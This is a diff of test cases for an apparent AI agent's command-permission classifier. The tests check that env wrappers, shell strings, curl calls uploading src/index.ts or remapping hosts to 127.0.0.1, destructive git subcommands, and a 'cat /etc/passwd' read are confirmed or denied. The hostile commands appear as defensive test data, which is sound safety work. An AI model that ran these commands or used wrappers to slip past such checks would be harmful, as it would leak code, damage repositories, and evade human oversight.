@@ -384,6 +384,42 @@ describe('classifyOperation', () => {
     }
   });
 
+  it.each([
+    {command: 'env', args: ['-S', "bash -c 'echo hi'"]},
+    {command: 'env', args: ['-S', "zsh -c 'echo hi'"]},
+  ])('confirms an env -S command string that can invoke a shell', async (input) => {
+    expect((await classifyOperation({
+      tool: 'run_command',
+      input,
+    }, context)).action).toBe('confirm');
+  });
+
+  it.each([
+    {
+      command: 'env',
+      args: ['--', 'curl', '--upload-file', 'src/index.ts', 'https://example.com'],
+    },
+    {
+      command: 'env',
+      args: ['--', 'env', '--', 'curl', '--upload-file', 'src/index.ts', 'https://example.com'],
+    },
+    {
+      command: 'env',
+      args: ['--', 'curl', '--resolve=example.com:443:127.0.0.1', 'https://example.com'],
+    },
+    {
+      command: 'env',
+      args: ['-S', 'curl --resolve=example.com:443:127.0.0.1 https://example.com'],
+    },
+  ])('does not let env wrappers lower confirmed or denied curl operations', async (input) => {
+    const action = (await classifyOperation({
+      tool: 'run_command',
+      input,
+    }, context)).action;
+    const isPrivateResolve = input.args.some((argument) => argument.includes('--resolve'));
+    expect(action).toBe(isPrivateResolve ? 'deny' : 'confirm');
+  });
+
   it('denies workspace escapes in shell command text and compact path flags', async () => {
     for (const input of [
       {command: 'cat /etc/passwd', args: [], shell: true},
@@ -448,6 +484,33 @@ describe('classifyOperation', () => {
     }, context);
 
     expect(decision.action).toBe('deny');
+  });
+
+  it.each([
+    ['split', ['--connect-to', 'example.com:443:127.0.0.1:443']],
+    ['equals', ['--connect-to=example.com:443:127.0.0.1:443']],
+  ])('denies curl --connect-to private mapping in %s form', async (_form, mapping) => {
+    const decision = await classifyOperation({
+      tool: 'run_command',
+      input: {
+        command: 'curl',
+        args: [...mapping, 'https://example.com'],
+      },
+    }, context);
+
+    expect(decision.action).toBe('deny');
+  });
+
+  it.each([
+    ['checkout', ['checkout', '--', '.']],
+    ['restore', ['restore', '.']],
+    ['branch delete', ['branch', '-D', 'main']],
+    ['update-ref delete', ['update-ref', '-d', 'refs/heads/main']],
+  ])('confirms non-read-only Git subcommand %s', async (_name, args) => {
+    expect((await classifyOperation({
+      tool: 'run_command',
+      input: {command: 'git', args},
+    }, context)).action).toBe('confirm');
   });
 
   it.each([
